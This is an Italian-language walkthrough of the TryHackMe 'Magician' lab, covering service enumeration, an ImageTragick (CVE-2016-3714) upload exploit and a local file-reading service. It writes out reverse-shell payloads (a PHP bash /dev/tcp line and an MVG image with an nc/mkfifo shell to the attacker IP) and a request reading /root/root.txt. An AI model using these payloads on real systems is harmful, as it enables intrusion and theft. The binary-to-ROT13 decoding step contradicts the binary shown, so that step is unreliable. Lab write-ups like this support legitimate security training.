
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/magician

```
echo "10.10.216.174   magician" >> /etc/hosts
```


```
nmap -Pn -vvv -O -p- magician
```
```
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack ttl 63
22/tcp   open  ssh             syn-ack ttl 63
8080/tcp open  http-proxy      syn-ack ttl 63
8081/tcp open  blackice-icecap syn-ack ttl 63

```

```
nmap -sVC -vv -p21,22,8080,8081 magician
```
```
ORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d3:ea:4b:50:51:ec:55:80:49:32:53:30:09:63:98:37 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJN3P6mY1FSAJ0J3MXrKYzSDDRGfrRLBnp08P5QvYCF7onrhQXh8fvUnVvctWqCix29bd7EH4zIdvLyA18e0CPTNC4HI/J8R1172AjrmxdotG4MVtNgeGTeEmtuXSN2QHPGbzAX/3XBZ46njmIV5oGT/fQmpVKvAcV2voMxFaYtqmUNl38SeFoM+/owHaeiDBiZLqsZOJ2atjOCAGl8OaESUtidBdrDRbOP3sZGowxTmj1AtClJNC/qST3ldFhK/NJBVpIA26qW2JTRi79KS7oYgO7mzRSrMIMqcZgoEIrxByGZXXK+H4uv2xgy7ndVeH70zcdqzAcaN8YgYbjN0LTsPUEmCvojDHpN0HAN3Gaf2+9IXqbSoGWGKjVFKEUtlxr5TVZv2P9AXodBWSmka8C8N4AUJitxhJWd8EqJwgxil+9AG2cwj/hJ/CzTH/WUNhBcvcCjRzuGQYprHpMvHanlC6Y3cUGPL4r7vEoUe16zHrnGJxnT9eMPReEFCuthlE=
|   256 18:ab:bf:b3:fb:01:c7:7f:25:78:ce:52:f4:2f:28:d8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIustRuVyL/YYC2U8jH51eeCwok9WGdfAMZSBwy55VF53q9/34nZuBgYblUzBJ7Rh7uMHXzL5u1Xq/9y7QJDyzg=
|   256 14:64:a9:f0:6c:21:c9:f9:51:4d:38:b4:40:00:d8:19 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHIYXoE8h5sIiHVpbe6sNAZrELmlonAK2/OqFjXNjM2f
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: magician
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
ftp magician
```
utente
```
anonymous
```
alla richiesta password facciamo invio

```
Name (magician:kali): anonymous
331 Please specify the password.
Password: 
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```
otteniamo questo messaggio
```
230-Eh? La porta si apre dopo un po' di tempo? Sei piuttosto paziente, vero, è una cosa chiamata 'delay_successful_login' in /etc/vsftpd.conf ;) Dato che sei un principiante, questo potrebbe aiutarti a iniziare: https://imagetragick.com. Potrebbe essere necessario apportare alcune piccole modifiche però...
```
vediamo cosa troviamo di utile su
https://imagetragick.com

ora vediamo cosa c'è su magician

```
http://magician:8080/
```
```
# Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.

Thu Aug 28 15:29:37 EDT 2025

There was an unexpected error (type=Not Found, status=404).

No message available
```

Visitiamo
```
http://magician:8081/
```
```
PNG to JPG converter - It works like magic!
```

Troviamo una pagina dove poter convertire i file immagine da png a jpg

analizziamo il sorgente della pagina e troviamo delle possibili vulnerabilità su questo file javascript
`app.2af72f5c.js`

1. **Validazione dei File**

`a("v-file-input",{ref:"file",attrs:{accept:"image/png",placeholder:"Select your PNG file you want to upload and convert","prepend-icon":"mdi-camera",label:"PNG"},on:{change:e.selectFile}})`

2. **Gestione degli Errori**

`a("v-alert",{ref:"alert",attrs:{value:e.alert,type:"error",dismissible:"true"}},[e._v(e._s(e.message))])`

3. **Sicurezza delle API**

`var f=p.a.create({baseURL:"http://magician:8080",headers:{"Content-type":"application/json"}});`

4. **Attacchi di Iniezione**

`v.upload(this.currentFile,(function(t){e.progress=Math.round(100*t.loaded/t.total)})).then((function(t){return e.message=t.data.message,v.getFiles()}))`

Ora proviamo a caricare un file png per vedere il processo di conversione

il nostro file convertito verrà recuperato da
http://magician:8080/files/pinguino.png

visto che non c'è convalida del file ci mettiamo in ascolto con
```
nc -lvnp 1234
```
e proviamo a caricare un una reverse shell

`revshell.php.png`
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```

tutto viene accettato ma non otteniamo la reverse shell

quindi facciamo un passo indietro torniamo sull'indizio che abbiamo trovato su
https://imagetragick.com/

**CVE-2016–3714**
Esistono diverse vulnerabilità in [ImageMagick](https://www.imagemagick.org/) , un pacchetto comunemente utilizzato dai servizi web per elaborare le immagini. Una di queste vulnerabilità può portare all'esecuzione di codice remoto (RCE) se si elaborano immagini inviate dagli utenti

creiamo la nostra  reverse shell ne ho trovato una in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

modifichiamola con il nostro IP e Porta

```
nano ImageTragikRevShell.png
```
```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc 10.14.99.134 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
pop graphic-context
pop graphic-context
```
ci mettiamo in ascolto con
```
nc -lvnp 4444
```

andiamo su
http://magician:8081/
e carichiamo la nostra RevShell

stabilizziamo la nostra reverse shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


```
magician@magician:~$ ls -la  
total 17204  
drwxr-xr-x 5 magician magician 4096 13 feb 2021 .  
drwxr-xr-x 3 root root 4096 30 gen 2021 ..  
lrwxrwxrwx 1 magician magician 9 6 feb 2021 .bash_history -> /dev/null  
-rw-r--r-- 1 magician magician 220 4 apr 2018 .bash_logout  
-rw-r--r-- 1 magician magician 3771 4 apr 2018 .bashrc  
drwx------ 2 magician magician 4096 30 gen 2021 .cache  
drwx------ 3 magician magician 4096 30 gen 2021 .gnupg  
-rw-r--r-- 1 magician magician 807 4 apr 2018 .profile  
-rw-r--r-- 1 mago mago 0 30 gen 2021 .sudo_as_admin_successful  
-rw------- 1 mago mago 7546 31 gen 2021 .viminfo  
-rw-r--r-- 1 root root 17565546 30 gen 2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar  
-rw-r--r-- 1 mago mago 170 13 feb 2021 the_magic_continues  
drwxr-xr-x 2 root root 4096 5 feb 2021 uploads  
-rw-r--r-- 1 mago mago 24 30 gen 2021 user.txt  
magician@magician:~$ cat the_magic_continues  
Il mago è noto per mantenere un ascolto locale gatto nella manica, si dice che sia un oracolo che ti svelerà segreti se sarai abbastanza bravo da capire i suoi miagolii.  
mago@mago:~$
```

```
cat user.txt
```
```
THM{simsalabim_hex_hex}
```

dall'indizio dato capiamo che c'è un servizio locale
```
ss -tunlp
```
```
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128                 0.0.0.0:8081             0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128               127.0.0.1:6666             0.0.0.0:*
LISTEN   0         100                       *:8080                   *:*        users:(("java",pid=915,fd=25))
LISTEN   0         32                        *:21                     *:*
```

C'è qualcosa sulla porta 6666

```
curl http://127.0.0.1:6666
```

```
<form action="" method="post" class="form" role="form">
    <div class="form-group ">
        <label class="control-label" for="filename">Enter filename</label>
        <input class="form-control" id="filename" name="filename" type="text" value="">
    </div>
    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
</form>
```

possiamo fare pivoting ma proviamo prima a vedere

```
curl http://127.0.0.1:6666 -s -X POST --data 'filename=/root/root.txt'
```
questo comando invia una richiesta POST al server locale sulla porta 6666, passando un dato che indica un file specifico (`/root/root.txt`).

```
<pre class="page-header">
1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011 1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101 1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110 1011111 1101101 1100001 1100100 1111101 1010
</pre>
```

La sequenza di numeri che hai fornito è una rappresentazione binaria di caratteri ASCII. Ogni gruppo di 8 bit (un byte) corrisponde a un carattere. Ecco la traduzione della sequenza binaria in testo:
```
GUZ{zntvp_znl_znxr_znal_zra_znq}
```

E ho ottenuto dei dati codificati che sembrano essere quelli dell'algoritmo **ROT13**

```
echo "GUZ{zntvp_znl_znxr_znal_zra_znq}" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# echo "GUZ{zntvp_znl_znxr_znal_zra_znq}" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
THM{xxxxxxxxxxxxx}
```
ecco la flag di root
```
THM{xxxxxxxxxxxxxxx}
```

